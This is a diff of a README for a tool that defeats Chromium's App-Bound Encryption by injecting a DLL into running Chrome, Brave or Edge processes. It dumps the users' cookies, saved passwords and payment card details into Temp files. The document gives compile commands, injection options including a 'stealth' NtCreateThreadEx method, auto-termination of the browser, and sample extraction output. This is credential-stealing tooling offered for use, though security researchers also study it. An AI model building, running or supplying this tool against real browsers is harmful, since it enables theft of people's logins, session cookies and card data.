@@ -1,42 +1,56 @@
 # Chrome App-Bound Encryption Decryption
 
 > **Purpose**  
-> Decrypt the **App‑Bound Encrypted (ABE)** keys stored in the *Local State* file of Chromium‑based browsers (**Chrome, Brave, Edge**) **without requiring administrative privileges**.
+> Decrypt the **App‑Bound Encrypted (ABE)** keys stored in the _Local State_ file of Chromium‑based browsers (**Chrome, Brave, Edge**) **without requiring administrative privileges**.
 
 If you find this project useful and want to support my work, I’d really appreciate a coffee:  
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)
 
-Starting with Chrome 127, Google introduced ABE: cookies (and, in future, passwords & payment data) are encrypted with a key that can only be decrypted by the browser’s own **IElevator** COM service *and* when the calling binary is inside the browser’s installation directory.
+Starting with Chrome 127, Google introduced ABE: cookies (and, in future, passwords & payment data) are encrypted with a key that can only be decrypted by the browser’s own **IElevator** COM service _and_ when the calling binary is inside the browser’s installation directory.
 
 This project bypasses that path‑validation requirement by injecting a small DLL into the running browser process and calling IElevator from there, supporting multiple injection methods, verbose debugging, auto‑start, and optional process cleanup and cookie extraction.
 
 ![image](https://github.com/user-attachments/assets/05cfdb2d-fe2a-4b4f-ab2b-50a46d6486ee)
 
-
 ## 📦 Supported & Tested Versions
 
-| Browser | Tested Version (x64 & ARM64) |
-|---------|-----------------------------|
-| **Google Chrome** | 136.0.7103.93 |
-| **Brave** | 1.78.94 (136.0.7103.60) |
-| **Microsoft Edge** | 136.0.3240.50  |
+| Browser            | Tested Version (x64 & ARM64) |
+| ------------------ | ---------------------------- |
+| **Google Chrome**  | 136.0.7103.93                |
+| **Brave**          | 1.78.94 (136.0.7103.60)      |
+| **Microsoft Edge** | 136.0.3240.50                |
 
 > [!NOTE]  
 > The injector requires the target browser to be **running** unless you use `--start-browser`.
 
 ## 🔧 Build Instructions
 
-1. **Clone** the repository and open a *Developer Command Prompt for VS* (or any MSVC‑enabled shell).  
-2. **Compile the DLL** (responsible for the decryption logic):
+1. **Clone** the repository and open a _Developer Command Prompt for VS_ (or any MSVC‑enabled shell).
 
-    ```bash
-    cl /EHsc /std:c++17 /LD /O2 /MT chrome_decrypt.cpp sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
-    ```
-3. **Compile the injector** (responsible for DLL injection & console UX):
+2. **Prepare SQLite Amalgamation**
 
-    ```bash
-    cl /EHsc /O2 /std:c++17 /MT chrome_inject.cpp version.lib ntdll.lib shell32.lib /link /OUT:chrome_inject.exe
-    ```
+   1. Download the [SQLite “autoconf” amalgamation](https://www.sqlite.org/download.html) and place `sqlite3.c` and `sqlite3.h` into your project root.
+
+   2. In a **Developer Command Prompt for VS** run:
+
+   ```bash
+   cl /nologo /W3 /O2 /MT /c sqlite3.c
+   lib /nologo /OUT:sqlite3.lib sqlite3.obj
+   ```
+
+   This produces a `sqlite3.lib` you can link into the DLL.
+
+3. **Compile the DLL** (responsible for the decryption logic):
+
+   ```bash
+   cl /EHsc /std:c++17 /LD /O2 /MT chrome_decrypt.cpp sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
+   ```
+
+4. **Compile the injector** (responsible for DLL injection & console UX):
+
+   ```bash
+   cl /EHsc /O2 /std:c++17 /MT chrome_inject.cpp version.lib ntdll.lib shell32.lib /link /OUT:chrome_inject.exe
+   ```
 
 Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.
 
@@ -52,8 +66,9 @@ Options
 
 - `--method load|nt`
   Injection method:
+
   - load = CreateRemoteThread + LoadLibrary (default)
-  - nt   = NtCreateThreadEx stealth injection
+  - nt = NtCreateThreadEx stealth injection
 
 - `--start-browser`
   Auto-launch the browser if it’s not already running.
@@ -106,7 +121,6 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 [*] 1 payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
 [*] Chrome terminated
 ```
-
 
 #### Verbose
 
@@ -167,13 +181,17 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 [#] HandleGuard: closing handle 228
 ```
 
-## 🍪 Cookie Extraction
+## 🍪 Data Extraction
 
-Once decryption completes, all cookies are emitted in JSON format into your Temp folder:
+Once decryption completes, three JSON files are emitted into your Temp folder:
 
-- `%TEMP%\<Browser>_decrypt_cookies.txt`  
+- **Cookies:** `%TEMP%\<Browser>_decrypt_cookies.txt`
+- **Passwords:** `%TEMP%\<Browser>_decrypt_passwords.txt`
+- **Payment Methods:** `%TEMP%\<Browser>_decrypt_payments.txt`
 
-Each file is a JSON array of objects:
+### Cookie Extraction
+
+Each cookie file is a JSON array of objects:
 
 ```json
 [
@@ -191,6 +209,50 @@ Each file is a JSON array of objects:
 ]
 ```
 
+### Password Extraction
+
+Each password file is a JSON array of objects:
+
+```json
+[
+  {
+    "origin": "https://example.com/login",
+    "username": "user@example.com",
+    "password": "••••••••••"
+  },
+  {
+    "origin": "https://another.example.com",
+    "username": "another_user",
+    "password": "••••••••••"
+  }
+  …
+]
+```
+
+### Payment Method Extraction
+
+Each payment file is a JSON array of objects:
+
+```json
+[
+  {
+    "name_on_card": "John Doe",
+    "expiration_month": 12,
+    "expiration_year": 2030,
+    "card_number": "••••••••••1234",
+    "cvc": "•••"
+  },
+  {
+    "name_on_card": "Jane Smith",
+    "expiration_month": 07,
+    "expiration_year": 2028,
+    "card_number": "••••••••••5678",
+    "cvc": "•••"
+  }
+  …
+]
+```
+
 ## 🆕 v0.6 Changelog
 
 - **New**: Full Username & Password extraction
@@ -198,16 +260,15 @@ Each file is a JSON array of objects:
 
 ## 🆕 v0.5 Changelog
 
-- **New**: Full Cookie extraction into JSON format 
+- **New**: Full Cookie extraction into JSON format
 
 ## 🆕 v0.4 Changelog
 
-- **New**: selectable injection methods (`--method load|nt`)  
-- **New**: auto‑start the browser if not running (`--start-browser`)  
-- **New**: verbose debug output (`--verbose`)  
-- **New**: automatically terminate the browser after decryption 
-- **Improved**: Injector code refactoring 
-
+- **New**: selectable injection methods (`--method load|nt`)
+- **New**: auto‑start the browser if not running (`--start-browser`)
+- **New**: verbose debug output (`--verbose`)
+- **New**: automatically terminate the browser after decryption
+- **Improved**: Injector code refactoring
 
 Further Links:
 
